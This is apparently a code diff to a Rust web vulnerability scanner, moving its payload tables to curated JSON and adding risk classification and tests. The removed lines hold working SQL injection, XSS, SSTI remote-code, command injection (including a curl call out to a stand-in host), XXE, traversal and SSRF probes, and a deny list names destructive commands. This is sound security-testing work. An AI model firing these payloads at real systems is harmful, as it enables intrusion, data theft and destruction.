@@ -1,7 +1,16 @@
-//! Classic payload tables — known high-probability probes for each vuln class.
+//! Payload tables — known high-probability probes for each vuln class.
 //!
 //! These are the "sweep the table first" seeds. The engine mutates from them,
 //! exploring the neighborhood of each proven payload rather than starting blind.
+//!
+//! Most tables are ported from a curated corpus (`payload_data/*.json`) carrying
+//! per-payload metadata — `context` (where the payload belongs: html_body, json,
+//! xml, attribute…), `severity`, `targets`, `encoding`, and a `description`. The
+//! metadata is carried through to results (e.g. JSONL output) and is the basis
+//! for future context-aware injection-point selection. NoSQLi has no curated
+//! source and keeps its hand-written table.
+
+use serde::Deserialize;
 
 /// Categories for payload classification.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
@@ -14,6 +23,7 @@ pub enum PayloadCategory {
     Xxe,
     NoSqli,
     Ssrf,
+    PrototypePollution,
     Custom,
 }
 
@@ -32,6 +42,18 @@ pub struct PayloadCase {
     pub payload: String,
     pub category: PayloadCategory,
     pub risk: PayloadRisk,
+    /// Human-readable description of what the payload does.
+    pub description: String,
+    /// Where the payload is meant to land: `html_body`, `json`, `xml`,
+    /// `attribute`, `url`, `string`, `numeric`, `js_string`, … Empty when
+    /// unknown (hand tables). Basis for context-aware injection selection.
+    pub context: String,
+    /// Impact hint from the curated corpus: `critical` / `high` / `medium` / `low`.
+    pub severity: String,
+    /// Wrapping/encoding applied to the payload (`raw`, `url`, `double_url`, …).
+    pub encoding: String,
+    /// Technology targets this payload is tuned for (`php`, `java`, `windows`, …).
+    pub targets: Vec<String>,
     pub tags: Vec<String>,
 }
 
@@ -42,8 +64,25 @@ pub struct PayloadTable {
     pub cases: Vec<PayloadCase>,
 }
 
+/// Raw shape of one entry in a curated `payload_data/*.json` file.
+#[derive(Debug, Deserialize)]
+struct RawPayload {
+    value: String,
+    #[serde(default)]
+    encoding: String,
+    #[serde(default)]
+    context: String,
+    #[serde(default)]
+    targets: Vec<String>,
+    #[serde(default)]
+    description: String,
+    #[serde(default)]
+    severity_hint: String,
+}
+
 impl PayloadTable {
-    /// Build from a legacy `&[&str]` table, assigning category, risk, and sequential IDs.
+    /// Build from a legacy `&[&str]` table, assigning category, risk, and
+    /// sequential IDs. Metadata fields are left empty (hand tables carry none).
     pub fn from_legacy(
         name: &str,
         category: PayloadCategory,
@@ -56,7 +95,42 @@ impl PayloadTable {
                 id: format!("{name}[{i}]"),
                 payload: p.to_string(),
                 category,
-                risk,
+                risk: classify_risk(risk, p),
+                description: String::new(),
+                context: String::new(),
+                severity: String::new(),
+                encoding: String::new(),
+                targets: vec![],
+                tags: vec![],
+            }).collect(),
+        }
+    }
+
+    /// Build from a curated JSON corpus (`payload_data/*.json`), preserving
+    /// per-payload metadata. `default_risk` is the table's floor; individual
+    /// payloads are upgraded to `Destructive` when their content warrants it
+    /// (see [`classify_risk`]), so a read-only table can still flag the odd
+    /// state-changing entry.
+    fn from_curated(
+        name: &str,
+        category: PayloadCategory,
+        default_risk: PayloadRisk,
+        json: &str,
+    ) -> Self {
+        let raw: Vec<RawPayload> = serde_json::from_str(json)
+            .unwrap_or_else(|e| panic!("payload_data/{name}.json is malformed: {e}"));
+        Self {
+            name: name.into(),
+            cases: raw.into_iter().enumerate().map(|(i, r)| PayloadCase {
+                id: format!("{name}[{i}]"),
+                risk: classify_risk(default_risk, &r.value),
+                payload: r.value,
+                category,
+                description: r.description,
+                context: r.context,
+                severity: r.severity_hint,
+                encoding: r.encoding,
+                targets: r.targets,
                 tags: vec![],
             }).collect(),
         }
@@ -71,200 +145,44 @@ impl PayloadTable {
     pub fn is_empty(&self) -> bool { self.cases.is_empty() }
 }
 
-// ── Built-in tables (constructed from the legacy const arrays) ────────────
+/// Upgrade a table's default risk to `Destructive` when a payload's content is
+/// state-changing or executes code — so a destructive probe can't hide inside
+/// an `Invasive`/`Safe` table and slip past the risk gate. Conservative: it
+/// prefers a false `Destructive` (over-cautious gating) to a false `Safe`.
+fn classify_risk(default: PayloadRisk, payload: &str) -> PayloadRisk {
+    let p = payload.to_ascii_lowercase();
+    const DESTRUCTIVE: &[&str] = &[
+        // SQL / NoSQL state changes
+        "drop table", "drop database", "delete from", "truncate", "insert into",
+        "update ", "alter table", "into outfile", "into dumpfile", "xp_cmdshell",
+        // command / RCE
+        "expect://", "rm -rf", "rm -r ", "mkfs", "shutdown", "reboot", "> /dev/sd",
+        "dd if=", ":(){", "/etc/shadow",
+    ];
+    if DESTRUCTIVE.iter().any(|needle| p.contains(needle)) {
+        PayloadRisk::Destructive
+    } else {
+        default
+    }
+}
 
-pub fn sqli_table()    -> PayloadTable { PayloadTable::from_legacy("sqli",    PayloadCategory::Sqlinjection,     PayloadRisk::Invasive,   SQLI_PAYLOADS) }
-pub fn xss_table()     -> PayloadTable { PayloadTable::from_legacy("xss",     PayloadCategory::Xss,              PayloadRisk::Safe,       XSS_PAYLOADS) }
-pub fn ssti_table()    -> PayloadTable { PayloadTable::from_legacy("ssti",    PayloadCategory::Ssti,             PayloadRisk::Invasive,   SSTI_PAYLOADS) }
-pub fn cmd_table()     -> PayloadTable { PayloadTable::from_legacy("cmd",     PayloadCategory::CommandInjection, PayloadRisk::Destructive, CMD_PAYLOADS) }
-pub fn traversal_table()-> PayloadTable { PayloadTable::from_legacy("traversal", PayloadCategory::PathTraversal,  PayloadRisk::Safe,       PATH_TRAVERSAL_PAYLOADS) }
-pub fn xxe_table()     -> PayloadTable { PayloadTable::from_legacy("xxe",     PayloadCategory::Xxe,              PayloadRisk::Invasive,   XXE_PAYLOADS) }
-pub fn nosqli_table()  -> PayloadTable { PayloadTable::from_legacy("nosqli",  PayloadCategory::NoSqli,           PayloadRisk::Invasive,   NOSQLI_PAYLOADS) }
-pub fn ssrf_table()    -> PayloadTable { PayloadTable::from_legacy("ssrf",    PayloadCategory::Ssrf,             PayloadRisk::Safe,       SSRF_PAYLOADS) }
+// ── Built-in tables ───────────────────────────────────────────────────────
+//
+// Curated tables embed their JSON at compile time (self-contained binary).
+// NoSQLi has no curated source and stays on its hand-written array.
 
-/// Classic SQL injection probes — ordered roughly by detection power.
-///
-/// Tier 1: error-triggering (fast, loud, confirmed)
-/// Tier 2: boolean/blind (slower, needs signal analysis)
-/// Tier 3: UNION-based (needs column count discovery)
-/// Tier 4: time-based (slow but reliable when all else fails)
-pub const SQLI_PAYLOADS: &[&str] = &[
-    // ── Tier 1: error-based ─────────────────────────────────────────────
-    "'",
-    "\"",
-    "' OR '1'='1",
-    "\" OR \"1\"=\"1",
-    "' OR 1=1--",
-    "\" OR 1=1--",
-    "' OR 1=1#",
-    "\" OR 1=1#",
-    "' OR '1'='1'--",
-    "' OR 1=1/*",
-    "') OR ('1'='1",
-    "\") OR (\"1\"=\"1",
-    "') OR 1=1--",
-    "\") OR 1=1--",
-    "admin'--",
-    "admin' #",
-    "' AND '1'='1",
-    "\" AND \"1\"=\"1",
-    "' AND 1=1--",
-    "' AND '1'='1'--",
-    "1' AND '1'='1",
-    "1\" AND \"1\"=\"1",
-    "' AND SLEEP(5)--",
-    "\" AND SLEEP(5)--",
-    "' AND SLEEP(5)#",
-    "1' AND SLEEP(5)--",
-    "' OR SLEEP(5)--",
-    // ── Tier 2: boolean/blind ───────────────────────────────────────────
-    "' AND '1'='2",
-    "\" AND \"1\"=\"2",
-    "' AND 1=2--",
-    "' AND 'a'='b",
-    "1' AND '1'='2",
-    // ── Tier 3: UNION-based ─────────────────────────────────────────────
-    "' UNION SELECT NULL--",
-    "\" UNION SELECT NULL--",
-    "' UNION SELECT NULL,NULL--",
-    "' UNION SELECT NULL,NULL,NULL--",
-    "' UNION SELECT NULL,NULL,NULL,NULL--",
-    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
-    "') UNION SELECT NULL--",
-    "1' UNION SELECT NULL--",
-    "1 UNION SELECT NULL--",
-    "' UNION SELECT 1,2,3--",
-    "' UNION SELECT 1,2,3,4--",
-    "' UNION SELECT 1,2,3,4,5--",
-    "' UNION SELECT @@version--",
-    "' UNION SELECT table_name FROM information_schema.tables--",
-    "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
-    // ── Tier 4: time-based ──────────────────────────────────────────────
-    "' OR IF(1=1,SLEEP(5),0)--",
-    "' AND IF(1=1,SLEEP(5),0)--",
-    "'; IF(1=1) WAITFOR DELAY '0:0:5'--",
-    "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
-    "' OR SLEEP(5)='",
-    // ── Stacked queries ─────────────────────────────────────────────────
-    "'; DROP TABLE users--",
-    "'; INSERT INTO users VALUES('hacker','pass')--",
-    "'; UPDATE users SET password='hacked' WHERE username='admin'--",
-    // ── Encoded variants ────────────────────────────────────────────────
-    "%27%20OR%201%3D1--",
-    "%22%20OR%201%3D1--",
-    "%%27%%20OR%%201%%3D1--",
-];
+pub fn sqli_table()      -> PayloadTable { PayloadTable::from_curated("sqli",      PayloadCategory::Sqlinjection,     PayloadRisk::Invasive,   include_str!("payload_data/sqli.json")) }
+pub fn xss_table()       -> PayloadTable { PayloadTable::from_curated("xss",       PayloadCategory::Xss,              PayloadRisk::Safe,       include_str!("payload_data/xss.json")) }
+pub fn ssti_table()      -> PayloadTable { PayloadTable::from_curated("ssti",      PayloadCategory::Ssti,             PayloadRisk::Invasive,   include_str!("payload_data/ssti.json")) }
+pub fn cmd_table()       -> PayloadTable { PayloadTable::from_curated("command",   PayloadCategory::CommandInjection, PayloadRisk::Destructive, include_str!("payload_data/command.json")) }
+pub fn traversal_table() -> PayloadTable { PayloadTable::from_curated("traversal", PayloadCategory::PathTraversal,    PayloadRisk::Safe,       include_str!("payload_data/traversal.json")) }
+pub fn xxe_table()       -> PayloadTable { PayloadTable::from_curated("xxe",       PayloadCategory::Xxe,              PayloadRisk::Invasive,   include_str!("payload_data/xxe.json")) }
+pub fn ssrf_table()      -> PayloadTable { PayloadTable::from_curated("ssrf",      PayloadCategory::Ssrf,             PayloadRisk::Safe,       include_str!("payload_data/ssrf.json")) }
+pub fn proto_pollution_table() -> PayloadTable { PayloadTable::from_curated("prototype_pollution", PayloadCategory::PrototypePollution, PayloadRisk::Invasive, include_str!("payload_data/prototype_pollution.json")) }
 
-/// Classic XSS probes — ordered by reflection context.
-pub const XSS_PAYLOADS: &[&str] = &[
-    "<script>alert(1)</script>",
-    "\"><script>alert(1)</script>",
-    "'><script>alert(1)</script>",
-    "<img src=x onerror=alert(1)>",
-    "\"><img src=x onerror=alert(1)>",
-    "'><img src=x onerror=alert(1)>",
-    "<svg onload=alert(1)>",
-    "\"><svg onload=alert(1)>",
-    "<body onload=alert(1)>",
-    "<iframe src=javascript:alert(1)>",
-    "javascript:alert(1)",
-    "'-alert(1)-'",
-    "\"-alert(1)-\"",
-    "<a href=\"javascript:alert(1)\">click</a>",
-    "<details open ontoggle=alert(1)>",
-    "<select autofocus onfocus=alert(1)>",
-    "<video><source onerror=alert(1)>",
-    "<marquee onstart=alert(1)>",
-    "{{constructor.constructor('alert(1)')()}}",
-    "${alert(1)}",
-    "<%= alert(1) %>",
-    "';alert(1)//",
-    "\";alert(1)//",
-    "</script><script>alert(1)</script>",
-    "%3Cscript%3Ealert(1)%3C/script%3E",
-];
+pub fn nosqli_table()    -> PayloadTable { PayloadTable::from_legacy("nosqli",  PayloadCategory::NoSqli, PayloadRisk::Invasive, NOSQLI_PAYLOADS) }
 
-/// Classic SSTI / template injection probes.
-pub const SSTI_PAYLOADS: &[&str] = &[
-    "{{7*7}}",
-    "${7*7}",
-    "<%= 7*7 %>",
-    "{{7*'7'}}",
-    "${7*'7'}",
-    "{{config}}",
-    "${config}",
-    "{{self}}",
-    "{{''.__class__}}",
-    "{{''.__class__.__mro__}}",
-    "{{''.__class__.__mro__[1].__subclasses__()}}",
-    "{{config.items()}}",
-    "{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['os'].popen('id').read()}}",
-    "{{lipsum.__globals__.os.popen('id').read()}}",
-    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
-    "{{joiner.__init__.__globals__.os.popen('id').read()}}",
-    "{{namespace.__init__.__globals__.os.popen('id').read()}}",
-    "${T(java.lang.Runtime).getRuntime().exec('id')}",
-    "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}",
-    "<%= system('id') %>",
-    "<%= IO.popen('id').readlines() %>",
-];
-
-/// Classic command injection probes.
-pub const CMD_PAYLOADS: &[&str] = &[
-    ";id",
-    "|id",
-    "`id`",
-    "$(id)",
-    "&&id",
-    "||id",
-    "%0aid",
-    "%0d%0aid",
-    ";sleep 5",
-    "|sleep 5",
-    "`sleep 5`",
-    "$(sleep 5)",
-    ";ping -c 5 127.0.0.1",
-    "|ping -c 5 127.0.0.1",
-    ";curl http://oast.example.com",
-    "|curl http://oast.example.com",
-    "';id;'",
-    "\";id;\"",
-    "';id;#",
-    "\";id;#",
-    "| cat /etc/passwd",
-    "; cat /etc/passwd",
-    "$(cat /etc/passwd)",
-    "`cat /etc/passwd`",
-];
-
-/// Classic path traversal / LFI probes.
-pub const PATH_TRAVERSAL_PAYLOADS: &[&str] = &[
-    "../../../etc/passwd",
-    "..\\..\\..\\windows\\win.ini",
-    "....//....//....//etc/passwd",
-    "..;/..;/..;/etc/passwd",
-    "/etc/passwd",
-    "C:\\windows\\win.ini",
-    "../../../etc/passwd%00",
-    "../../../etc/passwd\x00",
-    "..%2f..%2f..%2fetc%2fpasswd",
-    "..%252f..%252f..%252fetc%252fpasswd",
-    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-    "file:///etc/passwd",
-    "php://filter/convert.base64-encode/resource=index.php",
-    "php://filter/read=convert.base64-encode/resource=index.php",
-    "expect://id",
-    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
-];
-
-/// Classic XXE probes.
-pub const XXE_PAYLOADS: &[&str] = &[
-    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
-    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://oast.example.com\">]><foo>&xxe;</foo>",
-    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://oast.example.com\"> %xxe;]>",
-];
-
-/// Classic NoSQL injection probes.
+/// Classic NoSQL injection probes (no curated corpus — hand-written).
 pub const NOSQLI_PAYLOADS: &[&str] = &[
     "{\"$gt\": \"\"}",
     "{\"$ne\": null}",
@@ -281,15 +199,43 @@ pub const NOSQLI_PAYLOADS: &[&str] = &[
     "\";return true;var foo=\"",
 ];
 
-/// Classic SSRF probes.
-pub const SSRF_PAYLOADS: &[&str] = &[
-    "http://169.254.169.254/latest/meta-data/",
-    "http://127.0.0.1:8080",
-    "http://localhost:8080",
-    "http://[::1]:8080",
-    "http://0.0.0.0:8080",
-    "http://metadata.google.internal/computeMetadata/v1/",
-    "file:///etc/passwd",
-    "gopher://127.0.0.1:6379/_INFO",
-    "dict://127.0.0.1:6379/INFO",
-];
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn every_curated_table_parses_and_is_nonempty() {
+        let tables = [
+            sqli_table(), xss_table(), ssti_table(), cmd_table(),
+            traversal_table(), xxe_table(), ssrf_table(), proto_pollution_table(),
+        ];
+        for t in &tables {
+            assert!(!t.is_empty(), "{} parsed empty", t.name);
+            for c in &t.cases {
+                assert!(!c.payload.is_empty(), "{} has an empty payload", t.name);
+            }
+        }
+    }
+
+    #[test]
+    fn destructive_payloads_are_flagged() {
+        // xxe is an Invasive table, but its expect:// RCE entry must be Destructive.
+        let xxe = xxe_table();
+        let expect = xxe.cases.iter().find(|c| c.payload.contains("expect://"));
+        if let Some(c) = expect {
+            assert_eq!(c.risk, PayloadRisk::Destructive, "expect:// XXE must gate as Destructive");
+        }
+        // A DROP TABLE sqli entry (Invasive table) must be Destructive.
+        assert_eq!(classify_risk(PayloadRisk::Invasive, "'; DROP TABLE users--"), PayloadRisk::Destructive);
+        // A plain reflection probe stays at the table default.
+        assert_eq!(classify_risk(PayloadRisk::Safe, "<script>alert(1)</script>"), PayloadRisk::Safe);
+    }
+
+    #[test]
+    fn metadata_is_preserved() {
+        let xss = xss_table();
+        // Curated entries carry context + severity.
+        assert!(xss.cases.iter().any(|c| c.context == "html_body"));
+        assert!(xss.cases.iter().any(|c| !c.severity.is_empty()));
+    }
+}
